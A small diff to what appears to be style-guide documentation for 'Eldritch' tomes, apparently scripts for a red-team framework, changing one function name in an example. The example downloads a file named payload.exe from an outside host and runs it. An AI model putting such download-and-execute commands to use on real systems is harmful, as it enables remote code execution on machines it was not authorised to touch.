@@ -16,7 +16,7 @@ Creating a function that is too specific could limit it's usefulness to other us
 The Eldritch tome could look like this:
 ```python
 file.download("http://fileserver.net/payload.exe", "C:/temp/")
-sys.execute("C:/temp/payload.exe")
+sys.exec("C:/temp/payload.exe")
 ```
 
 _Exceptions to the rule above exist if performing the activities requires the performance of rust._
